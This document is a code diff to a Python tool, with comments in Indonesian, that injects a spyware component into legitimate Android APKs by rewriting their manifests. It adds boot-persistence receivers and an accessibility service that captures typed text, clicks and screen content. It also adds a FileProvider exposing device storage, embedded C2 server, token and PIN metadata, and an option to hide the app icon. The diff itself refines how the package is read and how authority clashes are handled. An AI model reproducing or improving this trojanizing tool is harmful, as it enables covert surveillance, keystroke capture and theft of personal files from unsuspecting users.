@@ -54,6 +54,7 @@ PERMISSIONS = [
 
 PKG = "ai.m4zk1play.spy"
 ALIAS = f"{PKG}.Launcher"
+FILES_SUFFIX = ".mzkfiles"
 
 BOOT_ACTIONS = [
     "android.intent.action.BOOT_COMPLETED",
@@ -66,6 +67,33 @@ BOOT_ACTIONS = [
     "android.intent.action.TIME_SET",
     "android.intent.action.TIMEZONE_CHANGED",
 ]
+
+A11Y_XML = (
+    '<?xml version="1.0" encoding="utf-8"?>\n'
+    '<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"\n'
+    '    android:accessibilityEventTypes="typeViewTextChanged|typeViewFocused|typeViewClicked|typeWindowStateChanged"\n'
+    '    android:accessibilityFeedbackType="feedbackGeneric"\n'
+    '    android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows|flagIncludeNotImportantViews"\n'
+    '    android:canRetrieveWindowContent="true"\n'
+    '    android:notificationTimeout="120" />\n'
+)
+
+PATHS_XML = (
+    '<?xml version="1.0" encoding="utf-8"?>\n'
+    "<paths>"
+    '<cache-path name="c" path="." />'
+    '<files-path name="f" path="." />'
+    '<external-path name="e" path="." />'
+    "</paths>\n"
+)
+
+
+def app_package(xml: str) -> str:
+    """Paket aplikasi induk. Authority FileProvider mengikuti nilai ini."""
+    m = re.search(r'<manifest[^>]*\bpackage="([^"]+)"', xml)
+    if m is None:
+        raise RuntimeError("tidak bisa membaca package dari AndroidManifest.xml")
+    return m.group(1)
 
 
 def _dex_numbers(decoded: Path) -> list[int]:
@@ -122,7 +150,7 @@ def _legacy_storage(xml: str) -> str:
     )
 
 
-def _injection(authority: str) -> str:
+def _injection(authority: str, app: str) -> str:
     boot = "\n".join(
         f'                <action android:name="{a}" />' for a in BOOT_ACTIONS
     )
@@ -194,7 +222,7 @@ def _injection(authority: str) -> str:
 
         <provider
             android:name="{PKG}.MzkFiles"
-            android:authorities="{authority}.files"
+            android:authorities="{app}{FILES_SUFFIX}"
             android:exported="false"
             android:grantUriPermissions="true">
             <meta-data
@@ -244,6 +272,14 @@ def _meta(c2_url: str, token: str, pin: str, email: str, team: str) -> str:
     )
 
 
+def _check_collision(xml: str, app: str) -> None:
+    if f'android:authorities="{app}{FILES_SUFFIX}"' in xml:
+        raise RuntimeError(
+            f"APK target sudah punya provider authority {app}{FILES_SUFFIX}. "
+            "Hapus provider lama atau pakai APK lain."
+        )
+
+
 def patch_manifest(decoded: Path, c2_url: str, token: str, pin: str,
                    email: str, team: str, hide: bool) -> None:
     mf = decoded / "AndroidManifest.xml"
@@ -252,12 +288,17 @@ def patch_manifest(decoded: Path, c2_url: str, token: str, pin: str,
     if "</application>" not in xml:
         raise RuntimeError("AndroidManifest.xml tidak lengkap")
 
+    app = app_package(xml)
+    _check_collision(xml, app)
+
     xml = _add_permissions(xml)
     xml = _legacy_storage(xml)
 
     authority = f"{PKG}.boot.{secrets.token_hex(4)}"
-    xml = xml.replace("</application>", _injection(authority) + "    </application>", 1)
-    xml = xml.replace("</application>", _meta(c2_url, token, pin, email, team) + "\n    </application>", 1)
+    xml = xml.replace("</application>", _injection(authority, app) + "    </application>", 1)
+    xml = xml.replace(
+        "</application>", _meta(c2_url, token, pin, email, team) + "\n    </application>", 1
+    )
 
     if hide:
         xml = re.sub(
@@ -267,26 +308,6 @@ def patch_manifest(decoded: Path, c2_url: str, token: str, pin: str,
         )
 
     mf.write_text(xml, encoding="utf-8")
-
-
-A11Y_XML = (
-    '<?xml version="1.0" encoding="utf-8"?>\n'
-    '<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"\n'
-    '    android:accessibilityEventTypes="typeViewTextChanged|typeViewFocused|typeViewClicked|typeWindowStateChanged"\n'
-    '    android:accessibilityFeedbackType="feedbackGeneric"\n'
-    '    android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows|flagIncludeNotImportantViews"\n'
-    '    android:canRetrieveWindowContent="true"\n'
-    '    android:notificationTimeout="120" />\n'
-)
-
-PATHS_XML = (
-    '<?xml version="1.0" encoding="utf-8"?>\n'
-    "<paths>"
-    '<cache-path name="c" path="." />'
-    '<files-path name="f" path="." />'
-    '<external-path name="e" path="." />'
-    "</paths>\n"
-)
 
 
 def inject_assets(decoded: Path) -> None:
